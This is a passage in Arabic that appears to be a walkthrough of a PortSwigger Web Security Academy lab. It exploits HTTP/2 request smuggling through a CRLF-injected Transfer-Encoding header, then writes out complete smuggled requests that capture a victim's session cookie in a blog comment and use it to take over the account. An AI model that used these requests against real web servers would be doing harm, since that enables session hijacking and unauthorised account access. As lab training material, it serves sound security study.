# [HTTP/2 request smuggling via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)

## **`الهدف`**
قم باستخدام ثغرة تهريب طلبات `HTTP/2` للوصول إلى حساب مستخدم آخر.
## **`خطوات الحل`**
سنقوم بالدخول على أى تدوينة وكتابة أى تعليق ببيانات عشوائية، وبعد ذلك سنقوم بالبحث عن هذا الطلب في `HTTP history` لنفحص بنية الطلب:
```http
POST /post/comment HTTP/2
Host: 0a4b00220414129d826a9c0d00fa0008.web-security-academy.net
Cookie: session=O5C2PFzh7Qp450vYdt5ws9LTToJ6jSfb
Content-Length: 126
Content-Type: application/x-www-form-urlencoded

csrf=L3VTOEbqmzyYewKfCwtg7uWyMlPt8cWn&postId=10&comment=test&name=kong&email=test%40test.com&website=https%3A%2F%2FExample.com
```

بعد ذلك سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater`
```http
GET / HTTP/2
Host: 0a4b00220414129d826a9c0d00fa0008.web-security-academy.net
Cookie: session=O5C2PFzh7Qp450vYdt5ws9LTToJ6jSfb
```
ثم سنقوم بالتالي:
1. تعديل الـ `Method` عن طريق الضغط على الـ `Mouse right-click` ونضغط `Change request method` ليصبح `POST`.
2. تعديل جسم الطلب ليناسب هجوم `H2.TE`.
3. إضافة ترويسة `Transfer-Encoding: chunked` ولكن بخدعة `Kettled` وهذا يجب أن يتم من داخل `Inspector` عن طريق إضافة ترويسة بأي أسم مثلا `TEST1` وتكون قيمتها `TEST2\r\nTransfer-Encoding: chunked`، ولا يمكن أن يتم هذا يدويًا في التمثيل النصي لـ`HTTP/2`.

ليصبح شكل الطلب فى النهاية كالتالي: مع مراعاة أننا سنحتاج إلى عدة تجارب لضبط قيمة الـ `Content-Length: 960` لكي لا تكون أقصر من اللازم فلا تظهر الـ `Cookie` الخاصة بالمستخدم ولا تكون أطول من اللازم فيتعطل الطلب
```http
POST / HTTP/2
Host: 0a4b00220414129d826a9c0d00fa0008.web-security-academy.net
Cookie: session=O5C2PFzh7Qp450vYdt5ws9LTToJ6jSfb
TEST1: TEST2\r\nTransfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0a4b00220414129d826a9c0d00fa0008.web-security-academy.net
Cookie: session=O5C2PFzh7Qp450vYdt5ws9LTToJ6jSfb
Content-Length: 960
Content-Type: application/x-www-form-urlencoded

csrf=L3VTOEbqmzyYewKfCwtg7uWyMlPt8cWn&postId=10&name=TEST&email=test%40test.com&website=https%3A%2F%2FExample.com&comment=
```

==**`ملاحظة هامة جدًا:`**== الطلب السابق لن يظهر بهذا الشكل داخل `Burp Suite` بسبب حقن `\r\n` داخل قيمة ترويسة فلا يمكن عرضه بنظام ال `text` لذلك سيتغير الشكل قليًلا ولن يكون ظاهرًا إلا نص الـ `Body` فقط.

وقد نحتاج إلى الانتظار قليًلا وربما إرساله أكثر من مرة حتى يقوم الضحية بإرسال أى طلب، وعندما ندخل إلى التدوينة سنجد تعليق يحتوى على الطلب التالي:
```http
GET / HTTP/1.1 
Host: 0a4b00220414129d826a9c0d00fa0008.web-security-academy.net 
sec-ch-ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99" 
sec-ch-ua-mobile: ?0 
sec-ch-ua-platform: "Linux" 
upgrade-insecure-requests: 1 
user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36 
accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 
sec-fetch-site: none 
sec-fetch-mode: navigate 
sec-fetch-user: ?1
sec-fetch-dest: document 
accept-encoding: gzip, deflate, br, zstd
accept-language: en-US,en;q=0.9 priority: u=0, i 
cookie: victim-fingerprint=8XIv57jkVJSzuFu9BaKeD8reNdL9qIu3; secret=U9KaYKoimvXMz4mmA1KzZKQbci2DHcUy; session=40rUOD5KHGLoW9dbkDO535SMtuLwOzQs; _lab_analytics=Gx3
```
بعد ذلك سنقوم بنسخ الـ `session=40rUOD5KHGLoW9dbkDO535SMtuLwOzQs` ونتوجه إلى المتصفح ونضغط `F12` ثم  `Application` ونضعه في خانة الـ `Session` داخل الـ `Cookies` ثم نضغط `Enter` لنجد أننا داخل حساب الضحية لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Response queue poisoning via H2.TE request smuggling](./Response-queue-poisoning-via-H2.TE-request-smuggling.md)
